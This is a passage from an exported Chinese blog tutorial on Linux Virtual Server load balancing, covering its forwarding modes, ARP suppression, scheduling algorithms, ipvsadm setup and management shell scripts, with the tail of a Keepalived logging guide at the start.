编辑配置文件/etc/sysconfig/keepalived\nKEEPALIVED_OPTIONS=\u0026quot;-D\u0026quot;\rKEEPALIVED_OPTIONS=\u0026quot;-D-d-S 0\u0026quot;\r说明：可以查看/etc/sysconfig/keepalived里注释获得上述参数的说明\n--vrrp -P #←只运行VRRP子系统.\r--check -C #←只运行健康检查子系统.\r--dont-release-vrrp -V #←不要在守护程序停止时删除VRRP VIP和VROUTE.\r--dont-release-ipvs -I #←不要在守护程序停止时删除IPVS拓扑.\r--dump-conf -d #←导出备份配置数据.\r--log-detail -D #←详细日志.\r--log-facility -S #←设置本地的syslog设备，编号0-7(default=LOG_DAEMON)0表示指定为local0设备\r2. 修改rsyslog的配置文件/etc/rsyslog.conf\n74 local0.*\t/var/log/keepalived.log\r上述配置表示来自local0设备的所有日志信息都记录到/var/log/keepalived.log文件。\n然后在约第42行如下信息的第一列结尾加入“；local0.none”：\n52 # Log anything (except mail) of level info or higher.\r53 # Don't log private authentication messages!\r54 *.info;mail.none;authpriv.none;cron.none;local0.none /var/log/messages\r上述配置表示来自local0设备的所有日志信息不再记录于/var/log/messages里。\n3. 配置完成后，重启rsyslog服务\nsystemctl restart rsyslog\r测试Keepalived日志记录结果。在重启Keepalived服务后，就会把日志信息输出到rsyslog定义的/var/log/keepalived.log文件\n$ head -3 /var/log/keepalived.log\rApr 9 18:58:54 lb_02 Keepalived[32024]: Starting Keepalived v(03/19,2017), git commit v1.3.5-6-g6fa32f2\rApr 9 18:58:54 lb_02 Keepalived[32024]: Unable to resolve default script username 'keepalived_script' - ignoring\rApr 9 18:58:54 lb_02 Keepalived[32024]: Opening file '/etc/keepalived/keepalived.conf'.\r","permalink":"https://www.oomkill.com/2017/02/keepalived/","summary":"","title":"Keepalived 高可用集群应用实践"},{"content":"LVS概述 负载均衡(Load Balance)集群提供了一种廉价、有效、透明的方法，来扩展网络设备和服务器的负载、带宽、增加吞吐量、加强网络数据处理能力、提高网络的灵活性和可用性。\n搭建负载均衡服务的需求\n把单台计算机无法承受的大规模的并发访问或数据流量分担到多台节点设备上分别处理，减少用户等待响应的时间，提升用户体验. 单个重负载的运算分担到多台节点设备上做并发处理，每个节点设备处理结束后，将结果汇总，返回给用户，系统处理能力得到大幅度提高。 7*24小时服务保证，任意一个或多个有限后面节点设备宕机，要求不能影响业务。 在负载均衡集群中，所有计算机节点都应该提供相同的服务。集群负载均衡器所截获所有对该服务的入站请求。然后将这些请求尽可能的平均分配在所有集群节点上。\nLVS (Linux Virtual Server)介绍 LVS是Linux Virtual Server的简写，意即Linux虚拟服务器，是一个虚拟的服务器集群系统，可在UNIX、Linux平台下实现负载均衡集群功能。该项目在1998年5月由章文嵩博士组织成立，是中国国内最早出现的自由软件项目之一\nLVS项目介绍 http://www.linuxvirtualserver.org/zh/lvs1.html\nLVS集群的体系结构 http://www.linuxvirtualserver.org/zh/lvs2.html\nLVS集群中的IP负载均衡技术 http://www.linuxvirtualserver.org/zh/lvs3.html\nLVS集群的负载调度 http://www.linuxvirtualserver.org/zh/lvs4.html\nIPVS（LVS）发展史 早在2.2内核时，IPVS就已经以内核补丁的形式出现。\n从2.4.23版本开始，IPVS软件就是合并到Linux内核的常用版本的内核补丁的集合。\n从2.4.24以后IPVS已经成为Linux官方标准内核的一部分。\nIPVS软件工作层次图 从上图可以看出，LVS负载均衡调度技术是在Linux内核中实现的，因此，被称之为Linux虚拟服务器（Linux virtual Server）。我们使用该软件配置LVS时候，不能直接配置内核中的ipvs，而需要使用ipvs的管理工具ipsadm进行管理.\nLVS技术点小结：\n真正实现调度的工具是IPVS， 工作在Linux内核层面 LVS自导IPVS管理工具是ipvsadm keepalived实现管理IPVS及负载均衡器的高可用。 RedHat工具Piranha WEB管理实现调度的工具IPVS。 LVS体系结构与工作原理简单描述 LVS集群负载均衡器接受服务的所有入站客户端计算机请求，并根据调度算法决定那个集群几点应该处理回复请求。负载均衡器简称(LB)有时也被成为LVS Director简称Director\nLVS虚拟服务器的体系结构如下图所示，一组服务器通过告诉的局域网或者地理分布的广域网互相连接，在他们的前端有一个负载调度器（Load Balancer）。负载调度器能无缝地将网络请求调度到真实服务器上，从而使得服务器集群的结构对客户是透明的，客户访问集群系统提供的网络服务就像访问一台高性能、高可用的服务器一样。客户程序不收服务器集群的影响不需作任何修改。胸的伸缩性通过在服务集群中透明的加入和删除一各节点来达到，通过检测节点或服务进程故障和正确地重置系统达到高可用性。由于我们的负载调度技术是在Linux内核中实现的，我们称之为Linux虚拟服务器（Linux Virtual Server）。\nLVS基本工作过程图 **LVS基本工作过程图1：带颜色的小方块代表不同的客户端请求\nLVS基本工作过程图2：\n不同的客户端请求小方块经过负载均衡器，通过指定的分配策略被分发到后面的机器上\nLVS基本工作过程图3：\nLVS基本工作过程图4：\nLVS相关术语命名约定 名称 缩写 说明 虚拟IP地址(Virtual IP Address) VIP VIP为Direcort用于向客户端计算机提供IP地址.如www.baidu.com域名就要解析到VIP上提供服务 真实IP地址(Real Server IP Address) RIP 在集群下面节点上使用的IP地址，物理IP地址 Director的IP地址(Director IP Address) DIP Director用于连接内外网络的IP地址，物理网卡上的IP地址，是负载均衡器上的IP 客户端主机IP地址(Client IP Address) CIP 客户端用户计算机请求集群服务器的IP地址，该地址用作发送给集群的请求的源IP地址 LVS集群内部的节点称为真实服务器(Real Server)，也叫做集群节点。请求集群服务的计算机称为客户端计算机。\n与计算机通常在网上交换数据包的方式相同，客户端计算机、Director和真实服务器使用IP地址彼此进行通信。\nLVS集群的4种工作模式介绍与原理讲解 IP虚拟服务器软件IPVS\n在调度器的实现技术中，IP负载金恒技术是效率最高的。在已有的IP负载均衡技术中有通过网络地址转换(Network Address Translation)将一组服务器构成一个高性能的、高可用的虚拟服务器，我们称之为VS/NAT技术(Virtual Server via Network Address Translation)，大多数商业化的IP负载均衡调度器产品都是使用NAT方法，如Cisco的LocalDirector、F5、Netscaler的Big/IP和Alteon的ACEDirector。\n在分析VS/NAT的缺点和网络服务的非对称性的基础上，我们提出通过IP隧道实现虚拟服务器方法VS/TUN(Virtual Server via IP Tunneling ) 和通过直接路由实现虚拟服务器的方法VS/DR(Virtual Server via Direct Routing )，它们可以极大地提高系统的伸缩性。所以，IPVS软件实现了这三种IP负载均衡技术，淘宝开源的模式FULLNAT。\nNAT模式==\u0026gt;网络地址转换\u0026lt;==收费站模式 Virtual Server via Network Address Translation (VS/NAT)\n通过网络地址转换，调度器LB重写请求报文的目标地址，根据预设的调度算法，将请求分派给后端的真实服务器；真实服务器的响应报文处理之后，返回时必须要通过调度器，经过调度器时报文的源地址被重写，再返回给客户，完成整个负载调度过程。\n⚠ 提示：VS/NAT模式，很类似公路上的收费站，来去都要经过LB负载均衡器，通过修改目的地址，端口或源端口。\n原理描述\n客户端通过Virtual IP Address（虚拟服务的IP地址）访问网络服务时，请求的报文到达调度器LB时，调度器根据连接调度算法从一组真实服务器中选出一台服务器，将报文的目标地址VIP改写成选的服务器的地址RIP1，请求报文的目标端口改写成选定服务器的相应端口（RS）提供服务端口，最后将修改后的报文发送给选出服务器RS1。同时，调度器LB在连接的Hash表中记录这个连接，当这个连接的下一个报文到达时，从连接的Hash表中可以得到原选定服务器的地址和端口，进行同样的改写操作，并将报文传给原选定的服务器RS1。当来自真实服务器RS1的相应报文返回调度器时，调度器将返回报文的源地址和源端口改为VIP和相应端口，然后调度器再把报文发给请求用户。in DNAT out SNAT。\nNAT模式小结\nNAT技术将请求的报文（通过DNAT方式改写）和响应的报文（通过SNAT方式改写），通过调度器地址重写然后在转发给内部的服务器，报文返回时在改写成原来的用户请求的地址。\n只需要在调度器LB上配置WAN公网IP即可，调度器也要有私有LAN IP和内部RS节点通信。\n每台内部RS节点的网关地址，必须要配成调度器LB的私有LAN内物理网卡地址 (LD1P)，这样才能确保数据报文返回时仍然经过调度器LB。\n由于清求与响应的数据报文都经过调度器LB.因此，网站访问早大时调度器LB有较大瓶颈，一般要求最多10-20台节点。\nNAT模式支持对IP及端口的转换，即用户请求10.0.0.1:80,可以通过调度器转换到RS节点的10.0.0.2:8080 (DR和TUN模式不具备的）。-\n所有NAT内部RS节点只需配置私有LAN IP即可。\n由于数据包来回都需要经过调度器，因此，要开启内核转发net.ipv4.ip_forward=1,当然也包括iptables防火枪的forward功能（DR和TUX模式不需要）。\nDR模式-直连路由模式 Virtual Server via Direct Routing (VS/DR)\nVS/DR模式是通过改写请求报文的目标MAC地址，将请求发给真实服务器的，而真实服务器将相应后的处理结果直接返回给客户端用户。同VS/TUN技术一样，VS/DR技术可极大的提高集群系统的伸缩性。而且，这种DR模式没有IP隧道的开销，对集群中的真实服务器也没有必须支持IP隧道协议的要求，但是要求调度器LB与真实服务器RS都有一块物理网卡连在同一物理网段上，即必须在同一个局域网环境。\n在LVS-DR配置中，Director将所有入站请求转发给集群内部节点，但集群内部的节点直接将他们的回复发给客户端计算机（没有通过Director回来）如图所示：\n⚠ 特别提示：(VS/DR)模式是互联网使用的最多的一种模式。 VS/DR模式的工作流程如下图所示：它的连接调度和管理与VS/NAT和VS/TUN中的一样，它的报文转发方法和前两种又有不同，DR模式将报文直接路由给目标服务器，在VS/DR模式中，调度器根据各个真实服务器的负载情况，连接数多少等，动态地选择一台服务器，不修改目的IP地址和目的端口，也不封装IP报文，而是将请求的数据帧的MAC地址改为选出服务器的MAC地址，然后再将修改后的数据帧在与服务器组的局域网上发送。因为请求的数据帧的MAC地址是选出的真实服务器，所以真实服务器肯定可以收到这个改写了目标MAC地址的数据帧，从中可以获得该请求的IP报文。当真实服务器发现 报文的目标地址VIP是在本地的网络设备上，真实服务器处理这个报文，然后根据路由表 将响应报文直接返回给客户。\n在VS/DR中，根据缺省的TCP/IP协议栈处理，请求报文的目标地址为VIP，响应报文的源地址肯定也为VIP，所以响应报文不需要作任何修改，可以直接返回给客户，客户认为得到正常的服务，而不会知道是哪一台服务器处理的。\nVS/DR负载调度器跟VS/TUN—样只处于从客户到服务器的半连接中，按照半连接的TCP有限状态机进行状态迁移。\n原理图：IN更改目的MAC/OUT null\nDR模式小结：\n通过在调度器LB上修改数据包的目的MAC地址实现转发。注意，源IP地址仍然是 CIP，目的IP地址仍然是VIP。 请求的报文经过调度器，而RS响应处理后的报文无需经过调度器LB，因此，并发访问量大时使用效率很高（和NAT模式比）。 因DR模式是通过MAC地址的改写机制实现的转发，因此，所有RS节点和调度器LB 只能在一个局域网LAN中（小缺点）。 需要注意RS节点的VIP的绑定（lo:vip/32，lo1:vip/32)和ARP抑制问题。 强调下：RS节点的默认网关不需要是调度器LB的DIP而直接是IDC机房分配的上级路由器的IP (这是RS带有外网IP地址的情况），理论讲：只要RS可以出网即可，不是必须要配置外网IP。 由于DR模式的调度器仅进行了目的MAC地址的改写，因此，调度器LB无法改变请求的报文的目的端口（和NAT要区别）。 当前，调度器LB支持几乎所有的UNIX, LINUX系统，但目前不支持WINDOWS系统。真实服务器RS节点可以是WINDOWS系统。 总的来说DR模式效率很高，但是配置也较麻烦，因此，访问量不是特别大的公司可以用haproxy/nginx取代。这符合运维的原则：简单、易用、高效。日1000-2000W PV或并发请求小于1W以下都可以考虑用haproxy/nginx（LVS NAT）模式 直接对外的业务访问，例如web服务做RS节点，RS最好用公网IP地址。如果不直接对外的业务，例如：MySQL，存储系统RS节点，最好只用内部IP地址。 Virtual Server via IP Tunneling (VS/TUN) 采用NAT技术时，由于请求和响应的报文都必须经过调度器地址重写，当客户请求越来越多时，调度器的处理能力将成为瓶颈。为了解决这个问题，调度器把请求的报文通过IP隧道（相当于ipip或ipsec ）转发至真实服务器，而真实服务器将响应处理后直接返回给客户端用户，这样调度器就只处理请求的入站报文。由于一般网络服务应答数据比请求报文大很多，采用VS/TUN技术后，集群系统的最大吞吐量可以提高10倍。\n它的连接调度和管理与VS/NAT中的一样，只是它的报文转发方法不同。调度器根据各个服务器的负载情况，连接数多少，动态地选择一台服务器，将原请求的报文封装在另一个IP报文中，再将封装后的IP报文转发给选出的真实服务器；真实服务器收到报文后，先将收到的报文解封获得原来目标地址为VIP地址的报文，服务器发现VIP地址被配置在本地的IP隧道设备上(此处要人为配置)，所以就处理这个请求，然后根据路由表将响应报文直接返回给客户。\nTUN模式\n负载均衡器通过把请求的报文通过IP隧道(ipip隧道)的方式(请求的报文不经过原目的地址的改写(包括MAC)，而是直接封装成另外的IP报文)，转发至真实服务器，而真实服务器将响应处理后直接返回给客户端用户。 由于真实服务器将响应处理后的报文直接返回给客户端用户，因此。最好RS有一个外网IP地址，这样效率才会更高。理论上：只要能出网即可，无需外网IP地址。 由于调度器LB只处理入站请求的报文。因此，此集群系统的吞吐量可以提高10倍以上，但隧道模式也会带来一定的系统开销。TUN模式适合LAN/WAN. TUN模式的LAN环境转发不如DR模式效率高，而且还要考虑系统对IP隧道的支持问题。 所有的RS服务器都要绑定VIP，抑制ARP，配置复杂. LAN环境一般多采用DR模式，WAN环境可以用TUN模式，但是当前在，WAN环境下，请求转发更多的被haproxy/nginx/DNS调度等代理取代。因此，TUN模式在国内公司实际应用的已经很少。跨机房应用要么拉光纤成局域网，要么DNS调度，底层数据还得同步. 直接对外的访问业务，例如:web服务做RS节点，最好用公网IP地址。不直接对外的业务，例如:MySQL,存储系统RS节点，最好用内部IP地址。 FULLNAT模式 淘宝网最新开源的 背景\nLVS当前应用主要采用DR和NAT模式，但这2种模式要求RealServer和LVS在同 一个vlan中，导致部署成本过髙：TUNNEL模式虽然可以跨vlan，但RealServer上需要部署ipip隧道模块等，网络拓扑上需要连通外网，较复杂，不易运维。 为了解决上述问题，我们在LVS上添加了一种新的转发模式：FULLNAT，该模式和NAT模式的区别是：Packet IN时，除了做DNAT,还做SNAT(用户ip-\u0026gt;内网ip),从而实现LVS-RealServer之间可以跨vlan通讯，RealServer只需要连接到内网;\n目标\nFULLNAT将作为一种新工作镆式（同DR/NAT/TUNNEL),实现如下功能：\nPacket IN时，目标IP更换为realserver ip，源IP更换为内网local IP； Packet OUT时，目标IP更换为client IP 注：Local IP为一组内网ip地址;性能要求，和NAT比，正常转发性能下降\u0026lt;10%。 ARP协议 什么是ARP协议 ARP协议，全称“Address Resolution Protocol”，中文名称是地址解析协议，使用ARP协议可实现通过IP地址获得对应主机的的物理地址（MAC）。\n在TCP/IP的网络环境下，每个互联网的主机都会被分配一个32位的IP地址，这种互联网地址是在网际范围标识主机的一种逻辑地址。为了让报文在物理网路上传输，还补习要知道对方目的主机的物理地址才行。这样就存在把IP地址变换成物理地址的地址转换问题。\n在以太网环境，为了正确地向目的主机传送报文，必须把目的主机的32为IP地址转换成为目的主机48位以太网地址(MAC),这个就需要在互联层有一个服务或功能将IP地址转换为相应的物理地址(MAC)，这个服务就是ARP协议。\n所谓的地址解析\u0026quot;地址解析\u0026quot;，就是主机在发送帧之前将目标IP地址转换成目标MAC地址的过程。ARP协议的基本功能就是通过目标设备的IP地址，查询目标设备的MAC地址，以保证主机间互相通信的顺利进行.\nARP协议和DNS有相像之处。不同点是：DNS实在域名和IP之间解析，另外ARP协议不需要配置服务，而DNS要配置服务才行。\nARP缓存表 在每台安装有TCP/IP协议的电脑里都会有一个ARP缓存表（windows命令提示符里输入arp -a即可）， 表里的IP地址与MAC地址是一一对应的。\nC:\\Users\\CM\u0026gt;arp -a\r接口: 192.168.1.103 --- 0x3\rInternet 地址 物理地址 类型\r192.168.1.1 3c-46-d8-5d-53-87 动态\r192.168.1.255 ff-ff-ff-ff-ff-ff 静态\r224.0.0.22 01-00-5e-00-00-16 静态\r224.0.0.251 01-00-5e-00-00-fb 静态\r224.0.0.252 01-00-5e-00-00-fc 静态\r239.11.20.1 01-00-5e-0b-14-01 静态\r239.255.255.250 01-00-5e-7f-ff-fa 静态\rarp常用命令\narp -a 查看所有记录\narp -d 清除\narp -s ip mac 绑定IP和MAC\nARP缓存是把双刃剑 主机有了arp缓存表，可以加快arp的解析速度，减少局域网内广播风暴。 正是有了arp缓存表，给恶意黑客带来了攻击服务器主机的风险，这个就是arp欺骗攻击 切换路由器，负载均衡器等设备时，可能会导致短时网络中断.\n为什么要使用ARP协议 OSI模型把网络工作分为7层，彼此不直接打交道，只通过接口(layer interface)。IP地址工作在第三层，MAC地址工作在第二层。当协议在发送数据包时，需要先封装第三层IP地址，第二层MAC地址的报头，但协议只知道目的的节点的IP地址，不知道目的节点的MAC地址，又不能跨第二、三层，所以得用ARP协议服务，来帮助获取到目的节点的MAC地址.\nosi7层模型协议 包封装解封装详解 http://www.tudou.com/programs/view/sP9JY_KranA\ntcp三次握手四次断开原理过程详解 http://www.tudou.com/programs/view/XjHCDedZQa8\nARP在生产环境产生的问题及解决办法 ARP病毒，ARP欺骗 高可用服务器对之间切换时要考虑ARP缓存问题 路由器等设备无缝迁移时要考虑ARP缓存的问题，例如：更换办公室的路由器.\nARP欺骗原理\nARP攻击就是通过伪造IP地址和MAC地址对实现ARP欺骗的，如果一台主机中了ARP病毒，那么它就能够在网络中产生大量的ARP通信量（它会以很快的频率进行广播），以至于使网络阻塞，攻击者只要持续不断的发出伪造ARP响应包就能更改局域网中目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。\nARP攻击主要是存在于局域网网络中，局域网中若有一个人感染ARP木马，则感染该ARP木马的系统将会试图通过“ARP欺骗”手段截获所在网络内其他计算机的通信故障。\n服务器切换ARP问题\n当网络中一台提供服务的机器宕机后，当在其他运行正常的机器添加宕机的机器的IP时，会因为客户端的ARP table cache的地址解析还是宕机的机器的MAC地址。从而导致，即使在其他运行正常的机器添加宕机的机器的IP，也会发生客户依然无法访问的情况。\n解决方法是：当宕机时，IP地址迁移到其他机器上时，需要通过arping命令来通知所有网络内机器清除其本地的ARP table cache，从而使得客户机访问时重新广播获取MAC地址。几乎所有的高可用软件都会考虑这个问题。\nARP广播而进行新的地址解析。\nlinux下具体命令：\narping -I eth0 -c 3 -s 10.0.0.162 10.0.0.253\rarping -U -I eth0 10.0.0.162\rLVS的调度算法 LVS的调度算法决定了如何在集群节点之间分布工作负荷。\n当Director调度器收到来自客户端计算机访问它的VIP上的集群服务的入站请求时，Director调度器必须决定哪个集群节点应该处理请求。Director调度器可用于做出该决定的调度方法分成两个基本类别:\n固定调度方法：rr wrr dh sh\n动态调度算法：wlc lc lblc lblcr SED NQ(后两种官方站点没提到，编译LVS, make过程可以看到召10种调度算法见如下表格：\n算法 说明 rr 轮循调度(Round-Robin)，它将请求依次分配不同的RS节点，也就是在RS节点中均摊请求。这种算法简单，但是只适合于RS节点处理性能相差不大的情况。 wrr 加权轮循调度(Weighted Round-Robin)，它将依据不同RS节点的权值分配任务。权值较高的RS将优先获得任务，并且分配到的连接数将比权值较低的RS节点更多。相同权值的RS得到相同数目的连接数。 dh 目的地址哈希调度(Destination Hashing)以目的地址为关键字查找一个静态hash表来获得需要的RS。 sh 源地址哈希调度(Source Hashing)以源地址为关键字查找一个静态hash表来获得需要的RS。 wlc 加权最小连接数调度(Weighted Least-Connection) 假设各台RS的权值依次为Wi(I=1..n)，当前的TCP连接数依次为Ti ( I= 1..n )，依次选取Ti/Wi为最小的RS作为 下一个分配的RS。 lc 最小连接数调度压(Least-Connection)，IPVS表存储了所有的活动的连接。把新的连接请求发送到当前连接数最小的RS。 lblc 基于地址的最小连接数调度(Locality-Based Least-Connection)，将来自同一目的地址的请求分配给同一台RS节点，如果这台服务器尚未满负荷，分配给连接数最小的RS，并以它为下一次分配的首先考虑。 lblcr 基于地址带重复最小连接数调度(Locality-Based Least-Connection with Replication)对于某一目的地址，对应有一个RS子集。对此地址请求，为它分配子集中连接数最小RS;如果子集中所有服务器均已满负荷，则从集群中选择一个连接数较小服务器，将它加入到此子集并分配连接;若一定时间内，未被做任何修改，则将子集中负载最大的节点从子集删除。 SED 最短的期望的延迟(Shortest Expected Delay Scheduling SED) (SED)\n基于wlc算法。这个必须举例来说了，\nABC三台机器分别权重123，连接数也分别是123。那么如果使用WLC算法的话一个新请求进入时它可能会分给ABC中的任意一个。使用sed算法后会进行这样一个运算。\nA(1+1)/1,\nB(1+2)/2,\nC(1+3)/3,\n根据运算结果，把连接交给C NQ 最少队列调度(Never Queue Scheduling NQ) (NQ)\n无需队列。如果有台realserver的连接数=0就直接分配过去，不需要在进行sed运算 LVS的调度算法的生产环境选型 (1) 一般的网络服务，如HTTP、Mail、MySQL等，常用的LVS调度算法为：\n基本轮叫调度rr算法 加权最小连接调度wlc 加权轮训调度wrr算法 (2) 基于局部性的最少链接LBLC和带复制的基于局部性最少链接LBLCR主要适用于Web Cache和Db Cache集群，但是我们很少这样用。\n(3) 源地址散列调度SH和目标地址散列调度DH可以结合使用在防火墙集群中，它们可以保证整个系统的唯一出入口。\n(4) 最短预期延时调度SED和不排队调度NQ主要是对处理时间相对比较长的网络服务。 实际使用中，这些算法的适用范围不限于这些。我们最好参考内核中的连接调度算法的实现原理，根据具体的业务需求合理的选型。\n安装LVS 下载地址：http://www.linuxvirtualserver.org/software/kernel-2.6/ipvsadm-1.26.tar.gz\n安装前准备\n# ipvs为lvs调度器，工作在内核层，先查看是否安装\rlsmod|grep ip_vs # 以uname -r结果为准工作中如果做安装虚拟化可能有多个内核，lvs是基于内核的\rln -s /usr/src/kernels/`uname -r`/ /usr/src/linux 安装依赖包\nyum install libnl-devel popt-devel popt-static #\u0026lt;==centos7未发现问题\rmake \u0026amp;\u0026amp; make install\r/sbin/ipvsadm || modprobe ip_vs\r$ lsmod|grep ip_vs\rip_vs 136798 0\rnf_conntrack 105702 1 ip_vs\rlibcrc32c 12644 2 xfs,ip_vs\rVS小结\n1、Centos5.X安装lvs，使用1.2.4版本。不要用1.2.6。\n2、Centos6.4安装lvs，使用1.2.6版本。并且需要先安装yum install libnl* popt*-y。\n3、安装lvs后，要执行ipvsadm把ip_vs模块加载到内核。\n手动配置LVS负载均衡服务 手工添加LVS转发 用户访问www.lb.com然后被DNS解析到vip 10.0.0.10，这个步骤是在DNS里配置的。 如果是自建DNS lb域的DNS记录设置如下\nwww IN A 10.0.0.10\r如果未自建dns，需要在购买DNS域名商提供的DNS管理界面增加类似上面的DNS记录一条。这里的IP地址一定外网地址，才能正式使用，我们假设192.168.1.0/24段为外网段。修改结果类似下图(必须做真正环境才能做下面修改)\n配置LVS虚拟IP (VIP) ifconfig eth0:0 10.0.0.10/24 up route add -host 10.0.0.10 dev eth0 #←添加主机路由，也可不加此行\r因虚拟网卡网段和VIP不在一个网段，需要设置路由，windows设置路由方法如下：\nroute -p add 10.0.0.0/24 192.168.2.23\rroute print\r到这里说明VIP\nC:\\Users\\CM\u0026gt;ping 10.0.0.10\r正在 Ping 10.0.0.10 具有 32 字节的数据:\r来自 10.0.0.10 的回复: 字节=32 时间\u0026lt;1ms TTL=64\r来自 10.0.0.10 的回复: 字节=32 时间\u0026lt;1ms TTL=64\r来自 10.0.0.10 的回复: 字节=32 时间\u0026lt;1ms TTL=64\r⚠ 提示:到这里说明VIP地址己经配好，并可以使用了。\n手工执行配置添加LVS服务并增加两台RS ipvsadm -C\ripvsadm --set 30 5 60\ripvsadm -A -t 10.0.0.10:80 -s wrr\ripvsadm -A -t 10.0.0.10:80 -s wrr -p 20\ripvsadm -a -t 10.0.0.10:80 -r 192.168.2.82:80 -g -w 1\ripvsadm -a -t 10.0.0.10:80 -r 192.168.2.21 -g -w 1\ripvsadm -D -t 10.0.0.10:80 -s wrr\ripvsadm -d -t 10.0.0.10:80 -r 192.168.2.21\r相关参数说明\n#\u0026lt;==清除内核虚拟服务器表中的所有记录\rEither long or short options are allowed.\r--add-service -A add virtual service with options\r--edit-service -E edit virtual service with options\r--delete-service -D delete virtual service\r--clear -C clear the whole table\r--restore -R restore rules from stdin\r--save -S save rules to stdout\r--add-server -a add real server with options\r--edit-server -e edit real server with options\r--delete-server -d delete real server\r--list -L|-l list the table\r--set tcp tcpfin udp set connection timeout values\r--tcp-service -t service-address service-address is host[:port]\r--udp-service -u service-address service-address is host[:port]\r--scheduler -s scheduler one of rr|wrr|lc|wlc|lblc|lblcr|dh|sh|sed|nq,\rthe default scheduler is wlc.\r--persistent -p [timeout] persistent service\r--netmask -M netmask persistent granularity mask\r--real-server -r server-address server-address is host (and port)\r--gatewaying -g gatewaying (direct routing) (default)\r--ipip -i ipip encapsulation (tunneling)\r--masquerading -m masquerading (NAT)\r--weight -w weight capacity of real server\r--mcast-interface interface multicast interface for connection sync\r--connection -c output of current IPVS connections\r--timeout output of timeout (tcp tcpfin udp)\r--stats output of statistics information\r此时，在浏览器访问10.0.0.10结果是无法访问的：因为根据LVS原理，RS在接收到包后发现不是自己IP后就丢弃了。 IPVS(也叫LVS)的源码分析之persistent参数 - 沧海一粟 - CSDN博客\n手工在RS端绑定 ifconfig lo:0 10.0.0.10/32 up #\u0026lt;==注意，子网掩码特殊\r每个集群节点上的环回接口 (lo) 设备上被绑定VIP地址(其广播地址是其本身，子网掩码是255.255.255.255，采取可变长掩码方式把网段划分成只含一个主机地址的目的避免ip地址冲突)允许LVS-DR集群中的集群节点接受发向该VIP地址的数据包，这会有一个非常严重的问题发生，集群内部的真实服务器将尝试回复来自正在请求VIP客户端ARP广播，这样所有的真实服务器都将声称自己拥有该VIP地址，这时客户端将有可能接发送请求数据包到某台真实服务器上，从而破坏了DR集群的负载均衡策略。因此，必须要抑制所有真实服务器响应目标地址为VIP的ARP广播，而把客户端ARP广播的响应交给负载均衡调度器。\n抑制ARP响应方法如下\necho \u0026quot;1\u0026quot; \u0026gt;/proc/sys/net/ipv4/conf/lo/arp_ignore\recho \u0026quot;2\u0026quot; \u0026gt;/proc/sys/net/ipv4/conf/lo/arp_announce echo \u0026quot;1\u0026quot; \u0026gt;/proc/sys/net/ipv4/conf/all/arp_ignore\recho \u0026quot;2\u0026quot; \u0026gt;/proc/sys/net/ipv4/conf/all/arp_announce\rarp抑制技术参数说明 中文说明:，\narp_ignore- INTEGER\n定义对目标地址为本地IP的ARP询问不同的应答模式。\n0 (默认值)：回应任何网络接口上对任何本地IP地址的arp查询请求。\n1：只回答目标IP地址是来访问网络接口本地地址的ARP查询请求\n2：只回答目标IP地址是来访网络接口本地地址的ARP查询请求，且来访IP必须在该网络接口的子网段内。\n3：不回应该网络界面的arp请求，而只对设置的唯一和连接地址做出回应。，\n4-7：保留未使用。‘\n8：不回应所有(本地地址)的arp查询。\narp_announce一INTEGER\n对网络接口上，本地IP地址的发出的，ARP回应，作出相应级别的限制：确定不同程度的限制，宣布对来自本地源lP地址发出Ail，请求的接口\n0 (默认)在任意网络接口(eth0,eth1, lo)上的任何本地地址\n1：尽量避免不在该网络接口子网段的本地地址做出arp回应.当发起ARP请求的源IP地址是被设置应该经由路由达到此网络接口的时候很有用。此时会检查来访IP是否为所有接口上的子网段内ip之一。如果该来访IP不属于各个网络接口上的子网段内，那么将采用级别2的方式来进行处理。\n2：一对查询目标使用最适当的本地地址，在此模式下将忽略这个IP数据包的源地址并尝试能与该地址通信的本地地址，首要是选择所有的网络接口的子网中外出访问子网中包含该目标IP地址的本地地址。如果没有合适的地址被发现，将选择当前的发送网络接口或其他的有可能接受到该ARP回应的网络接来进发送。限制了使用本地VIP地址作为优先的网络接口。\n检查手工添加LVS转发成果 测试LVS服务的转发：\n首先在客户端浏览器访问RS http://192.168.1.6 及 RS http://192.168.1.7 确认是否RS端正常然后访问DR的VIP http://10.0.0.10， 如果经过多次测试能分别出现RS1, RS2的 不同结果内容就是表示配置成功。\n⚠ 提示:负载均衡的算法倾向于一个客户端IP定向到一个后端服务器，以保持会话连贯性，如果用两三台机器去测试也许就不一样。\n在访问的同时可以用命令查看状态信息 $ ipvsadm -L -n --stats\rIP Virtual Server version 1.2.1 (size=4096)\rProt LocalAddress:Port Conns InPkts OutPkts InBytes OutBytes\r-\u0026gt; RemoteAddress:Port\rTCP 10.0.0.10:80 88 674 0 88293 0\r-\u0026gt; 192.168.2.21:80 44 355 0 47851 0\r-\u0026gt; 192.168.2.82:80 44 319 0 40442 0\r使用脚本配置lvs负载均衡服务 #!/bin/sh\rVIP='10.0.0.10'\r. /etc/init.d/functions\rPort=80\rRIP=(\r192.168.2.21\r192.168.2.82\r)\rclean_all(){\ripvsadm -C\rreturn $?\r}\rset_virtual_server(){\ripvsadm --set 30 5 60\ripvsadm -A -t $VIP:$Port -s wrr\rreturn $?\r}\rstart(){\rclean_all\r[ $? -eq 0 ] \u0026amp;\u0026amp; set_virtual_server || return 1\rfor n in ${RIP[@]}\rdo\ripvsadm -a -t $VIP:$Port -r $n:$Port -g -w 1\rdone\r}\rstop(){\rclean_all\r}\rusage(){\recho 'USAGE:'$0 '{start|stop|restart}'\r}\rcase \u0026quot;$1\u0026quot; in\rstart|START)\rstart\r;;\rstop|STOP)\rstop\r;;\rrestart|RESTART)\rstop\rstart\r;;\r*)\rusage\resac\r#!/bin/sh\r. /etc/init.d/functions\rmaster_ip=192.168.2.23\rVIP='10.0.0.10'\rPort=80\rRIP=(\r192.168.2.21\r192.168.2.82\r)\rset_virtual_server(){\ripvsadm --set 30 5 60\ripvsadm -A -t $VIP:$Port -s wrr\rreturn $?\r}\rcheck_master(){ /usr/bin/ping -c 2 $master_ip \u0026amp;\u0026gt;/dev/null\rreturn $?\r}\rclean_all(){\ripvsadm -C\r}\rstart(){\rclean_all \u0026amp;\u0026amp; /sbin/ifconfig eth0:0 $VIP/24 up\r[ $? -eq 0 ] \u0026amp;\u0026amp; set_virtual_server || return 10\rfor n in ${RIP[@]}\rdo\r/sbin/ipvsadm -a -t $VIP:$Port -r $n:$Port -g -w 1\rdone\r}\rstop(){\rclean_all\r/sbin/ifconfig eth0:0 $VIP/24 down\r}\rcheck_isnode(){\rnum=`ipvsadm -L -n|grep 192|wc -l`\rif [ $num -lt ${#RIP[@]} ];then\rreturn 0\rfi\rreturn 